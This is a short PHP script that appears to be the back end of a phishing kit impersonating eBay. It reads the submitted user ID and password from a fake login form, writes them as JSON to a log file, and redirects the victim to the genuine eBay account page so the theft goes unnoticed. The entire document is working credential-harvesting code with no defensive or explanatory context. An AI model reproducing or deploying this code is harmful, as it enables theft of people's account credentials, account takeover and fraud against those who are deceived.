<?php

header('Location: https://accounts.ebay.com/acctxs/user');
$data = array('site' => 'Ebay',
  'user' => $_POST['userid'],
  'pass' => $_POST['password']);

  $json_data = json_encode($data);

  $f = fopen('../../../logs/info.txt', 'w+');
  fwrite($f, $json_data);
  fclose($f);
exit();
?>